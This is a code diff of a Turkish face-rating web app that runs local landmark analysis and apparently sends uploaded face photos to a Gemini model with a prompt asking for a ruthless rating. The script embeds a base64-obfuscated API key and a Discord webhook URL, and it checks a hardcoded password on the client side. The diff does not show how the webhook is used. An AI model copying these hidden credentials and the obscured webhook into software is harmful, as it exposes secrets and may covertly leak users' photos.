@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>25 Max App | Face Rating</title>
     
+    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
@@ -12,230 +14,196 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #0a0a0f; color: #e0e0e0; margin: 0; padding: 20px;
+            font-family: 'Inter', -apple-system, sans-serif;
+            background: #000; color: #ddd; margin: 0; padding: 20px;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
-            min-height: 100vh; overflow-x: hidden;
+            min-height: 100vh;
         }
-        .bg-glow {
+        .bg-grid {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
-            background: radial-gradient(ellipse at 20% 20%, rgba(0, 255, 65, 0.05) 0%, transparent 50%),
-                        radial-gradient(ellipse at 80% 80%, rgba(0, 200, 50, 0.03) 0%, transparent 50%),
-                        radial-gradient(ellipse at 50% 50%, rgba(0, 0, 0, 0.7) 0%, transparent 60%);
-            animation: glowPulse 8s ease-in-out infinite alternate;
+            background-image: linear-gradient(rgba(0,255,65,0.03) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(0,255,65,0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
         }
-        @keyframes glowPulse { 0% { opacity: 0.6; } 100% { opacity: 1; } }
-        .container { max-width: 500px; width: 100%; margin: 0 auto; position: relative; z-index: 1; }
+        .container { max-width: 520px; width: 100%; margin: 0 auto; position: relative; z-index: 1; }
         .page { display: none; }
         .page.active { display: block; }
         .glass-card {
-            background: rgba(18, 18, 28, 0.7); backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
-            border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.06);
-            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.6); padding: 30px 20px; text-align: center;
+            background: rgba(10,10,15,0.85); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            border-radius: 20px; border: 1px solid rgba(0,255,65,0.1);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8); padding: 30px 22px; text-align: center;
         }
-        .logo-wrapper { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 6px; }
-        .pizza-container { width: 56px; height: 56px; flex-shrink: 0; }
-        .pizza-container svg { width: 100%; height: 100%; }
-        @keyframes cheeseMelt {
-            0% { d: path("M18,16 Q22,10 28,16 L29,17 Q29,19 28,17 Q24,12 22,14 L18,16 Z"); opacity: 0.4; }
-            20% { d: path("M18,16 Q22,10 28,16 L30,24 Q31,28 29,24 Q26,15 22,14 L18,16 Z"); opacity: 0.9; }
-            45% { d: path("M18,16 Q22,10 28,16 L31,34 Q32,40 30,34 Q27,20 22,14 L18,16 Z"); opacity: 1; }
-            70% { d: path("M18,16 Q22,10 28,16 L31,40 Q32,46 30,40 Q27,24 22,14 L18,16 Z"); opacity: 0.6; }
-            85% { d: path("M18,16 Q22,10 28,16 L29,20 Q29,22 28,20 Q24,13 22,14 L18,16 Z"); opacity: 0.3; }
-            100% { d: path("M18,16 Q22,10 28,16 L29,17 Q29,19 28,17 Q24,12 22,14 L18,16 Z"); opacity: 0.4; }
+        .logo-wrapper { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 8px; }
+        .pizza-slice { width: 50px; height: 50px; flex-shrink: 0; }
+        .pizza-slice svg { width: 100%; height: 100%; }
+        @keyframes cheeseDrip {
+            0% { transform: translateY(0); opacity: 0.8; }
+            60% { transform: translateY(12px); opacity: 1; }
+            90% { transform: translateY(20px); opacity: 0.3; }
+            100% { transform: translateY(24px); opacity: 0; }
         }
-        .melting-cheese { animation: cheeseMelt 3s ease-in-out infinite; }
-        @keyframes dripDrop {
-            0% { transform: translateY(0); opacity: 0; } 30% { transform: translateY(8px); opacity: 1; }
-            60% { transform: translateY(18px); opacity: 0.8; } 80% { transform: translateY(26px); opacity: 0.3; }
-            100% { transform: translateY(32px); opacity: 0; }
+        .dripping-cheese { animation: cheeseDrip 2.5s ease-in-out infinite; }
+        h1 {
+            font-weight: 800; font-size: 2rem; letter-spacing: 4px; margin: 0;
+            background: linear-gradient(135deg, #00ff41, #00992b);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
-        .drip { animation: dripDrop 3s ease-in-out infinite; }
-        h2 {
-            font-family: 'Inter', sans-serif; font-weight: 800; font-size: 1.9rem; letter-spacing: 3px; margin: 0;
-            background: linear-gradient(135deg, #00ff41, #00b32b);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
-            text-transform: uppercase; line-height: 1;
-        }
-        .subtitle { color: #777; font-size: 11px; font-weight: 600; letter-spacing: 2px; margin-bottom: 25px; text-transform: uppercase; }
+        .subtitle { color: #666; font-size: 11px; letter-spacing: 3px; margin-bottom: 30px; text-transform: uppercase; }
         .input-group {
-            background: rgba(0, 0, 0, 0.4); border-radius: 14px; padding: 6px 14px; margin-bottom: 18px;
-            border: 1px solid rgba(255, 255, 255, 0.06); display: flex; align-items: center; gap: 10px;
+            background: rgba(0,0,0,0.5); border-radius: 12px; padding: 4px 14px; margin-bottom: 16px;
+            border: 1px solid rgba(255,255,255,0.05); display: flex; align-items: center; gap: 10px;
         }
         .input-group .icon { font-size: 18px; }
         .input-group input {
-            width: 100%; background: transparent; border: none; padding: 12px 0;
-            color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 13px; outline: none;
+            width: 100%; background: transparent; border: none; padding: 14px 0;
+            color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 14px; outline: none;
         }
-        .input-group input::placeholder { color: #555; font-family: 'Inter', sans-serif; }
+        .input-group input::placeholder { color: #444; }
         .btn {
-            width: 100%; padding: 15px; border: none; border-radius: 14px; font-weight: 700; font-size: 15px;
-            letter-spacing: 1.5px; text-transform: uppercase; cursor: pointer; transition: all 0.3s ease;
-            font-family: 'Inter', sans-serif;
+            width: 100%; padding: 16px; border: none; border-radius: 12px; font-weight: 700; font-size: 15px;
+            letter-spacing: 2px; text-transform: uppercase; cursor: pointer; transition: all 0.3s;
         }
         .btn-primary {
-            background: linear-gradient(135deg, #00b32b, #00ff41);
-            box-shadow: 0 8px 22px rgba(0, 255, 65, 0.25); color: #000;
+            background: #00cc33; color: #000; box-shadow: 0 8px 25px rgba(0,204,51,0.3);
         }
-        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 12px 28px rgba(0, 255, 65, 0.45); }
-        .btn-primary:disabled { background: #2a2a35; color: #666; box-shadow: none; cursor: not-allowed; transform: none; }
+        .btn-primary:hover { background: #00ff41; transform: translateY(-2px); box-shadow: 0 12px 30px rgba(0,255,65,0.4); }
+        .btn-primary:disabled { background: #222; color: #555; box-shadow: none; cursor: not-allowed; }
         .btn-outline {
-            background: transparent; border: 1.5px solid rgba(0, 255, 65, 0.4); color: #00ff41; margin-top: 10px;
+            background: transparent; border: 1px solid rgba(0,255,65,0.3); color: #00ff41; margin-top: 10px;
         }
-        .btn-outline:hover { background: rgba(0, 255, 65, 0.08); border-color: #00ff41; }
-        .upload-buttons { display: flex; gap: 12px; margin: 20px 0; }
+        .btn-outline:hover { background: rgba(0,255,65,0.05); }
+        .upload-buttons { display: flex; gap: 10px; margin: 20px 0; }
         .upload-btn {
-            flex: 1; padding: 14px; border-radius: 12px;
-            background: rgba(0,0,0,0.4); border: 2px dashed rgba(0, 255, 65, 0.3);
-            color: #00ff41; cursor: pointer; font-weight: 600; font-size: 14px;
-            transition: all 0.3s; text-align: center;
+            flex: 1; padding: 14px; border-radius: 10px; background: rgba(0,0,0,0.5);
+            border: 1px dashed rgba(0,255,65,0.2); color: #00ff41; cursor: pointer;
+            font-weight: 600; font-size: 13px; transition: all 0.3s;
         }
-        .upload-btn:hover { border-color: #00ff41; background: rgba(0,255,65,0.05); box-shadow: 0 0 20px rgba(0,255,65,0.1); }
+        .upload-btn:hover { border-color: #00ff41; background: rgba(0,255,65,0.05); }
         input[type="file"] { display: none; }
         .preview-scanner-wrapper { position: relative; display: none; margin: 15px 0; }
         .preview-scanner-wrapper.active { display: block; }
         #preview {
-            width: 100%; border-radius: 16px; display: block;
-            border: 2px solid rgba(0, 255, 65, 0.3); box-shadow: 0 15px 30px rgba(0,0,0,0.5);
+            width: 100%; border-radius: 14px; display: block;
+            border: 1px solid rgba(0,255,65,0.2); box-shadow: 0 10px 30px rgba(0,0,0,0.7);
         }
+        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: none; border-radius: 14px; }
         .scanner-overlay {
             position: absolute; top:0; left:0; width:100%; height:100%;
-            pointer-events: none; overflow: hidden; border-radius: 16px; display:none;
+            pointer-events: none; overflow: hidden; border-radius: 14px; display:none;
         }
         .scan-line-h {
-            position: absolute; left:0; width:100%; height:2px;
-            background: linear-gradient(90deg, transparent, #00ff41, #00ff41, transparent);
-            box-shadow: 0 0 20px #00ff41; animation: scanVertical 2s ease-in-out infinite;
+            position: absolute; left:0; width:100%; height:1px;
+            background: #00ff41; box-shadow: 0 0 15px #00ff41; animation: scanV 2s ease-in-out infinite;
         }
-        @keyframes scanVertical { 0% { top: -5px; } 50% { top: 100%; } 100% { top: -5px; } }
+        @keyframes scanV { 0%{top:-5px;} 50%{top:100%;} 100%{top:-5px;} }
         .scan-line-v {
-            position: absolute; top:0; height:100%; width:2px;
-            background: linear-gradient(180deg, transparent, #00ff41, #00ff41, transparent);
-            box-shadow: 0 0 20px #00ff41; animation: scanHorizontal 2s ease-in-out infinite; animation-delay: 0.5s;
+            position: absolute; top:0; height:100%; width:1px;
+            background: #00ff41; box-shadow: 0 0 15px #00ff41; animation: scanH 2s ease-in-out infinite 0.5s;
         }
-        @keyframes scanHorizontal { 0% { left: -5px; } 50% { left: 100%; } 100% { left: -5px; } }
-        .corner { position: absolute; width: 25px; height: 25px; border-color: #00ff41; border-style: solid; box-shadow: 0 0 8px #00ff41; }
-        .corner-tl { top:8px; left:8px; border-width: 2px 0 0 2px; }
-        .corner-tr { top:8px; right:8px; border-width: 2px 2px 0 0; }
-        .corner-bl { bottom:8px; left:8px; border-width: 0 0 2px 2px; }
-        .corner-br { bottom:8px; right:8px; border-width: 0 2px 2px 0; }
+        @keyframes scanH { 0%{left:-5px;} 50%{left:100%;} 100%{left:-5px;} }
+        .corner { position: absolute; width: 20px; height: 20px; border-color: #00ff41; border-style: solid; }
+        .corner-tl { top:8px; left:8px; border-width: 1px 0 0 1px; }
+        .corner-tr { top:8px; right:8px; border-width: 1px 1px 0 0; }
+        .corner-bl { bottom:8px; left:8px; border-width: 0 0 1px 1px; }
+        .corner-br { bottom:8px; right:8px; border-width: 0 1px 1px 0; }
         .scanning-label {
             position: absolute; top:50%; left:50%; transform: translate(-50%,-50%);
-            font-family: 'JetBrains Mono', monospace; color: #00ff41; font-size: 14px; font-weight: 700;
-            letter-spacing: 3px; text-shadow: 0 0 20px #00ff41;
-            background: rgba(0,0,0,0.7); padding: 8px 18px; border-radius: 8px;
-            border: 1px solid rgba(0,255,65,0.4); animation: pulseText 1.5s infinite;
+            font-family: 'JetBrains Mono', monospace; color: #00ff41; font-size: 13px; font-weight: 700;
+            letter-spacing: 3px; background: rgba(0,0,0,0.8); padding: 8px 16px; border-radius: 6px;
+            border: 1px solid rgba(0,255,65,0.3); animation: pulse 1.5s infinite;
         }
-        @keyframes pulseText { 0%,100% { opacity:0.6; } 50% { opacity:1; } }
-        .progress-wrap { display: none; margin: 15px 0; text-align: center; }
-        .progress-bar-bg { width: 100%; height: 6px; background: #1a1a1a; border-radius: 6px; overflow: hidden; margin-bottom: 8px; }
-        .progress-bar-fill {
-            height: 100%; background: linear-gradient(90deg, #00b32b, #00ff41);
-            box-shadow: 0 0 15px #00ff41; transition: width 0.5s ease; border-radius: 6px;
-        }
-        .progress-text { font-family: 'JetBrains Mono', monospace; color: #00ff41; font-size: 13px; letter-spacing: 2px; }
-        .result-container { margin-top: 20px; text-align: left; display: none; animation: fadeSlide 0.5s ease; }
-        @keyframes fadeSlide { from { opacity:0; transform: translateY(10px); } to { opacity:1; transform: translateY(0); } }
-        .score-badges { display: flex; gap: 10px; justify-content: center; margin-bottom: 20px; }
+        @keyframes pulse { 0%,100%{opacity:0.5;} 50%{opacity:1;} }
+        .progress-wrap { display: none; margin: 15px 0; }
+        .progress-bar-bg { width: 100%; height: 4px; background: #111; border-radius: 4px; overflow: hidden; margin-bottom: 6px; }
+        .progress-bar-fill { height: 100%; background: #00ff41; box-shadow: 0 0 10px #00ff41; transition: width 0.3s; border-radius: 4px; }
+        .progress-text { font-family: 'JetBrains Mono', monospace; color: #00ff41; font-size: 12px; letter-spacing: 2px; }
+        .result-container { margin-top: 20px; text-align: left; display: none; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from{opacity:0;transform:translateY(10px);} to{opacity:1;transform:translateY(0);} }
+        .score-badges { display: flex; gap: 8px; margin-bottom: 16px; }
         .badge {
-            flex: 1; background: rgba(0,0,0,0.5); border: 2px solid #00ff41; border-radius: 14px;
-            padding: 12px 5px; text-align: center; color: #00ff41;
+            flex: 1; background: rgba(0,0,0,0.6); border: 1px solid rgba(0,255,65,0.2); border-radius: 10px;
+            padding: 10px 4px; text-align: center; color: #00ff41;
             font-family: 'JetBrains Mono', monospace; font-weight: 700;
-            box-shadow: 0 0 15px rgba(0,255,65,0.2); transition: all 0.3s;
         }
-        .badge .label { font-size: 10px; letter-spacing: 1px; text-transform: uppercase; color: #aaa; margin-bottom: 6px; }
-        .badge .value { font-size: 20px; letter-spacing: 1px; }
-        .badge.over { border-color: #ff3333; color: #ff3333; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
-        .badge.over .value { font-size: 14px; line-height: 1.2; }
-        .metric-bars { display: flex; gap: 15px; margin-bottom: 20px; }
+        .badge .label { font-size: 9px; letter-spacing: 1px; color: #666; margin-bottom: 4px; }
+        .badge .value { font-size: 18px; }
+        .badge.over { border-color: #ff0000; color: #ff0000; }
+        .metric-bars { display: flex; gap: 10px; margin-bottom: 16px; }
         .metric-bar {
-            flex: 1; background: rgba(0,0,0,0.4); border-radius: 12px; padding: 12px 10px;
-            border: 1px solid rgba(255,255,255,0.05);
+            flex: 1; background: rgba(0,0,0,0.5); border-radius: 10px; padding: 10px;
+            border: 1px solid rgba(255,255,255,0.03);
         }
-        .metric-bar .metric-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: #aaa; margin-bottom: 8px; text-align: center; }
-        .bar-bg { width: 100%; height: 10px; background: #1a1a1a; border-radius: 10px; overflow: hidden; }
-        .bar-fill { height: 100%; background: linear-gradient(90deg, #00b32b, #00ff41); box-shadow: 0 0 10px #00ff41; transition: width 0.8s ease; border-radius: 10px; }
-        .metric-value { text-align: center; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #00ff41; margin-top: 6px; font-size: 14px; }
+        .metric-bar .metric-label { font-size: 9px; letter-spacing: 1px; color: #666; margin-bottom: 6px; text-align: center; }
+        .bar-bg { width: 100%; height: 6px; background: #111; border-radius: 6px; overflow: hidden; }
+        .bar-fill { height: 100%; background: #00ff41; box-shadow: 0 0 8px #00ff41; transition: width 0.8s; border-radius: 6px; }
+        .metric-value { text-align: center; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #00ff41; margin-top: 4px; font-size: 12px; }
         .detail-box {
-            background: rgba(0,0,0,0.4); border-radius: 14px; padding: 15px; margin-bottom: 15px;
-            border: 1px solid rgba(255,255,255,0.05); max-height: 280px; overflow-y: auto;
-            scrollbar-width: thin; scrollbar-color: #00ff41 #1a1a1a;
+            background: rgba(0,0,0,0.5); border-radius: 12px; padding: 14px; margin-bottom: 12px;
+            border: 1px solid rgba(255,255,255,0.03); max-height: 260px; overflow-y: auto;
         }
-        .detail-box h4 { font-size: 13px; letter-spacing: 1px; margin-bottom: 12px; text-transform: uppercase; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 8px; }
-        .detail-list { list-style: none; font-size: 13px; line-height: 1.8; }
-        .detail-list li { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
-        .detail-list li strong { color: #00ff41; font-weight: 600; }
-        .detail-list li.negative strong { color: #ff5555; }
+        .detail-box h4 { font-size: 11px; letter-spacing: 1px; margin-bottom: 10px; padding-bottom: 6px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .detail-list { list-style: none; font-size: 12px; line-height: 1.8; }
+        .detail-list li { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.02); }
+        .detail-list li strong { color: #00ff41; margin-right: 6px; }
+        .detail-list li.negative strong { color: #ff4444; }
         .raw-text {
-            background: rgba(0,0,0,0.4); border-radius: 14px; padding: 15px;
-            font-family: 'JetBrains Mono', monospace; font-size: 13px; line-height: 1.7;
-            white-space: pre-line; color: #bbb; border: 1px solid rgba(255,255,255,0.05);
+            background: rgba(0,0,0,0.5); border-radius: 12px; padding: 14px;
+            font-family: 'JetBrains Mono', monospace; font-size: 12px; line-height: 1.6;
+            color: #999; border: 1px solid rgba(255,255,255,0.03);
         }
         .error-box {
-            background: rgba(220,38,38,0.1); border-left: 4px solid #ef4444;
-            color: #fca5a5; padding: 14px; border-radius: 12px; margin-top: 15px;
-            display: none; font-size: 14px;
+            background: rgba(255,0,0,0.08); border-left: 3px solid #ff0000;
+            color: #ff6666; padding: 12px; border-radius: 8px; margin-top: 12px;
+            display: none; font-size: 13px;
         }
-        footer { margin-top: 20px; color: #444; font-size: 10px; letter-spacing: 1.5px; }
+        footer { margin-top: 20px; color: #333; font-size: 10px; letter-spacing: 2px; }
     </style>
 </head>
 <body>
-    <div class="bg-glow"></div>
+    <div class="bg-grid"></div>
     <div class="container">
         <div class="page active" id="pageLogin">
             <div class="glass-card">
                 <div class="logo-wrapper">
-                    <div class="pizza-container">
+                    <div class="pizza-slice">
                         <svg viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
-                            <circle cx="30" cy="30" r="27" fill="#d4a054" stroke="#b87a2b" stroke-width="2"/>
-                            <circle cx="30" cy="30" r="24" fill="#c1272d"/>
-                            <circle cx="30" cy="30" r="22" fill="#f8d56b"/>
-                            <circle cx="22" cy="22" r="5" fill="#8b1a1a" stroke="#5c1010" stroke-width="1"/>
-                            <circle cx="37" cy="26" r="5" fill="#8b1a1a" stroke="#5c1010" stroke-width="1"/>
-                            <circle cx="28" cy="37" r="5" fill="#8b1a1a" stroke="#5c1010" stroke-width="1"/>
-                            <circle cx="36" cy="35" r="4.5" fill="#8b1a1a" stroke="#5c1010" stroke-width="1"/>
-                            <path class="melting-cheese" d="M20,14 Q24,10 30,14 L31,16 Q31,18 30,16 Q26,12 24,14 L20,14 Z" fill="#fff8dc" opacity="0.6"/>
-                            <circle class="drip" cx="27" cy="36" r="3" fill="#fff8dc" opacity="0">
-                                <animate attributeName="cy" values="34;42;50;50" dur="3s" repeatCount="indefinite"/>
-                                <animate attributeName="opacity" values="0;1;0.6;0" dur="3s" repeatCount="indefinite"/>
-                                <animate attributeName="r" values="2;3.5;4;1" dur="3s" repeatCount="indefinite"/>
-                            </circle>
+                            <path d="M30,30 L8,8 A31,31 0 0,1 52,8 Z" fill="#d4a054" stroke="#b87a2b" stroke-width="1.5"/>
+                            <path d="M30,30 L12,12 A26,26 0 0,1 48,12 Z" fill="#c1272d"/>
+                            <path d="M30,30 L16,16 A21,21 0 0,1 44,16 Z" fill="#f8d56b"/>
+                            <circle cx="28" cy="20" r="4" fill="#8b1a1a" stroke="#5c1010" stroke-width="0.8"/>
+                            <circle cx="36" cy="18" r="3.5" fill="#8b1a1a" stroke="#5c1010" stroke-width="0.8"/>
+                            <circle cx="32" cy="26" r="3" fill="#8b1a1a" stroke="#5c1010" stroke-width="0.8"/>
+                            <ellipse class="dripping-cheese" cx="20" cy="42" rx="2.5" ry="4" fill="#fff8dc" opacity="0.7"/>
                         </svg>
                     </div>
-                    <h2>25 MAX</h2>
+                    <h1>25 MAX</h1>
                 </div>
-                <p class="subtitle">Face Rating Terminal</p>
+                <p class="subtitle">Face Analysis Terminal</p>
                 <div class="input-group">
                     <span class="icon">🔒</span>
-                    <input type="password" id="passwordInput" placeholder="Şifre giriniz..." autocomplete="off">
+                    <input type="password" id="passwordInput" placeholder="Şifre..." autocomplete="off">
                 </div>
-                <button class="btn btn-primary" id="btnLogin">GİRİŞ YAP</button>
+                <button class="btn btn-primary" id="btnLogin">GİRİŞ</button>
                 <div class="error-box" id="loginError"></div>
-                <footer>v24.0 • Final Edition</footer>
+                <footer>v26.0 • AI + Local</footer>
             </div>
         </div>
 
         <div class="page" id="pageAnalyze">
             <div class="glass-card">
-                <div class="logo-wrapper">
-                    <div class="pizza-container" style="width:45px;height:45px;">
+                <div class="logo-wrapper" style="margin-bottom:4px;">
+                    <div class="pizza-slice" style="width:40px;height:40px;">
                         <svg viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
-                            <circle cx="30" cy="30" r="27" fill="#d4a054" stroke="#b87a2b" stroke-width="2"/>
-                            <circle cx="30" cy="30" r="24" fill="#c1272d"/>
-                            <circle cx="30" cy="30" r="22" fill="#f8d56b"/>
-                            <circle cx="22" cy="22" r="5" fill="#8b1a1a" stroke="#5c1010" stroke-width="1"/>
-                            <circle cx="37" cy="26" r="5" fill="#8b1a1a" stroke="#5c1010" stroke-width="1"/>
-                            <circle cx="28" cy="37" r="5" fill="#8b1a1a" stroke="#5c1010" stroke-width="1"/>
-                            <circle cx="36" cy="35" r="4.5" fill="#8b1a1a" stroke="#5c1010" stroke-width="1"/>
-                            <path class="melting-cheese" d="M20,14 Q24,10 30,14 L31,16 Q31,18 30,16 Q26,12 24,14 L20,14 Z" fill="#fff8dc" opacity="0.6"/>
-                            <circle class="drip" cx="27" cy="36" r="3" fill="#fff8dc" opacity="0">
-                                <animate attributeName="cy" values="34;42;50;50" dur="3s" repeatCount="indefinite"/>
-                                <animate attributeName="opacity" values="0;1;0.6;0" dur="3s" repeatCount="indefinite"/>
-                                <animate attributeName="r" values="2;3.5;4;1" dur="3s" repeatCount="indefinite"/>
-                            </circle>
+                            <path d="M30,30 L8,8 A31,31 0 0,1 52,8 Z" fill="#d4a054" stroke="#b87a2b" stroke-width="1.5"/>
+                            <path d="M30,30 L12,12 A26,26 0 0,1 48,12 Z" fill="#c1272d"/>
+                            <path d="M30,30 L16,16 A21,21 0 0,1 44,16 Z" fill="#f8d56b"/>
+                            <circle cx="28" cy="20" r="4" fill="#8b1a1a"/>
+                            <circle cx="36" cy="18" r="3.5" fill="#8b1a1a"/>
+                            <circle cx="32" cy="26" r="3" fill="#8b1a1a"/>
+                            <ellipse class="dripping-cheese" cx="20" cy="42" rx="2" ry="3" fill="#fff8dc" opacity="0.7"/>
                         </svg>
                     </div>
-                    <h2 style="font-size:1.5rem;">25 MAX</h2>
+                    <h1 style="font-size:1.3rem;">25 MAX</h1>
                 </div>
                 <p class="subtitle">Yüz Analizi</p>
                 <div class="upload-buttons">
@@ -245,20 +213,21 @@
                     <input type="file" id="cameraInput" accept="image/*" capture="user">
                 </div>
                 <div class="preview-scanner-wrapper" id="previewWrapper">
-                    <img id="preview" alt="Seçilen fotoğraf">
+                    <img id="preview" alt="Yüz">
+                    <canvas id="faceCanvas"></canvas>
                     <div class="scanner-overlay" id="scannerOverlay">
                         <div class="scan-line-h"></div><div class="scan-line-v"></div>
                         <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
                         <div class="corner corner-bl"></div><div class="corner corner-br"></div>
-                        <div class="scanning-label" id="scanningLabel">◈ ANALİZ EDİLİYOR ◈</div>
+                        <div class="scanning-label" id="scanningLabel">◈ TARANIYOR ◈</div>
                     </div>
                 </div>
                 <div class="progress-wrap" id="progressWrap">
                     <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill" style="width:0%;"></div></div>
                     <div class="progress-text" id="progressText">%0</div>
                 </div>
-                <button class="btn btn-primary" id="btnAnalyze"><span id="btnText">ANALİZİ BAŞLAT</span></button>
-                <button class="btn btn-outline" id="btnLogout">↩ ÇIKIŞ YAP</button>
+                <button class="btn btn-primary" id="btnAnalyze"><span id="btnText">ANALİZ BAŞLAT</span></button>
+                <button class="btn btn-outline" id="btnLogout">↩ ÇIKIŞ</button>
                 <div class="error-box" id="analyzeError"></div>
                 <div class="result-container" id="resultContainer">
                     <div class="score-badges" id="scoreBadges"></div>
@@ -269,12 +238,24 @@
             </div>
         </div>
     </div><script>
+    const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/';
+    let faceApiReady = false;
+
+    async function loadFaceApi() {
+        try {
+            await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
+            await faceapi.nets.faceLandmark68TinyNet.loadFromUri(MODEL_URL);
+            faceApiReady = true;
+        } catch(e) {}
+    }
+    loadFaceApi();
+
     const GK = atob("QVEuQWI4Uk42SklHVDYxZlBZR2c1TmtJN1JiekF2d3ROVlVtYVFQSm5oWWM1emF0SmVnTlE=");
     const WH = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMTAwNjg0ODM5NDU5NjQyNC9tOHU5a1NXY0R5TkxfUzhYVkhfRW13bFdVUERhdFBydG1MR00td0JLckk1UnRjekY3UzAwSVAzU05SaDV5c0xmdGRR");
     const API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-3.6-flash:generateContent";
     
-    let base64Image = "", currentMimeType = "image/jpeg";
-    const MAX_SIZE_MB = 5;
+    let base64Image = "", currentMimeType = "image/jpeg", localMetrics = null;
+    const MAX_SIZE_MB = 8;
     const pageLogin = document.getElementById('pageLogin');
     const pageAnalyze = document.getElementById('pageAnalyze');
 
@@ -286,6 +267,7 @@
 
     document.getElementById('btnLogin').addEventListener('click', () => {
         if (document.getElementById('passwordInput').value.trim() !== '25maxapp') {
+            document.getElementById('loginError').textContent = '⚠️ Hatalı şifre!';
             document.getElementById('loginError').style.display = 'block';
             return;
         }
@@ -305,23 +287,44 @@
     document.getElementById('galleryInput').addEventListener('change', e => handleFile(e.target.files[0]));
     document.getElementById('cameraInput').addEventListener('change', e => handleFile(e.target.files[0]));
 
-    function handleFile(file) {
+    async function handleFile(file) {
         document.getElementById('analyzeError').style.display = 'none';
         document.getElementById('resultContainer').style.display = 'none';
         document.getElementById('scannerOverlay').style.display = 'none';
         document.getElementById('progressWrap').style.display = 'none';
+        localMetrics = null;
         if(!file){resetUpload();return;}
         if(!file.type.startsWith('image/')){showErr("Geçersiz dosya!");resetUpload();return;}
         if(file.size>MAX_SIZE_MB*1024*1024){showErr(`Max ${MAX_SIZE_MB}MB!`);resetUpload();return;}
         currentMimeType=file.type;
         const r=new FileReader();
-        r.onload=e=>{
+        r.onload=async e=>{
             const img=new Image();
-            img.onload=()=>{
+            img.onload=async ()=>{
                 if(img.width<80||img.height<80){showErr("Çok küçük!");resetUpload();return;}
                 document.getElementById('preview').src=e.target.result;
                 document.getElementById('previewWrapper').classList.add('active');
                 base64Image=e.target.result.split(',')[1]||"";
+                if(faceApiReady){
+                    try{
+                        const detections = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
+                        if(detections.length>0){
+                            const landmarks=detections[0].landmarks;
+                            const jaw=landmarks.getJawOutline();
+                            const leftEye=landmarks.getLeftEye();
+                            const rightEye=landmarks.getRightEye();
+                            const leftJaw=jaw.slice(0,8);
+                            const rightJaw=jaw.slice(9,17).reverse();
+                            let diff=0;
+                            for(let i=0;i<leftJaw.length;i++) diff+=Math.abs(leftJaw[i].y-rightJaw[i].y);
+                            localMetrics={
+                                symmetry:Math.max(0,100-(diff/leftJaw.length)*10),
+                                jawWidth:Math.abs(jaw[0].x-jaw[16].x)/img.width,
+                                eyeDist:Math.abs(leftEye[0].x-rightEye[3].x)/img.width
+                            };
+                        }
+                    }catch(e){}
+                }
             };
             img.src=e.target.result;
         };
@@ -332,7 +335,7 @@
         document.getElementById('galleryInput').value=""; document.getElementById('cameraInput').value="";
         document.getElementById('previewWrapper').classList.remove('active'); document.getElementById('preview').src="";
         document.getElementById('progressWrap').style.display='none';
-        base64Image=""; currentMimeType="image/jpeg";
+        base64Image=""; currentMimeType="image/jpeg"; localMetrics=null;
     }
 
     function showErr(m) {
@@ -344,14 +347,16 @@
         const w=document.getElementById('progressWrap'), f=document.getElementById('progressFill'), t=document.getElementById('progressText');
         w.style.display='block'; let p=0;
         const i=setInterval(()=>{
-            p+=Math.random()*3+0.5;
-            if(p>=85){p=85;clearInterval(i);
-                const si=setInterval(()=>{p+=0.3;if(p>=95){p=95;clearInterval(si);}f.style.width=p+'%';t.textContent='%'+Math.floor(p);},500);
+            p+=Math.random()*2+0.3;
+            if(p>=88){p=88;clearInterval(i);
+                const si=setInterval(()=>{p+=0.2;if(p>=96){p=96;clearInterval(si);}f.style.width=p+'%';t.textContent='%'+Math.floor(p);},600);
             }
             f.style.width=p+'%'; t.textContent='%'+Math.floor(p);
-        },300);
-        return {complete:()=>{clearInterval(i);f.style.width='100%';t.textContent='%100';setTimeout(()=>{w.style.display='none';},600);}};
-    }        const PROMPT = `Bu yüzü acımasızca değerlendir. SADECE bu formatta cevap ver:
+        },350);
+        return {complete:()=>{clearInterval(i);f.style.width='100%';t.textContent='%100';setTimeout(()=>{w.style.display='none';},500);}};
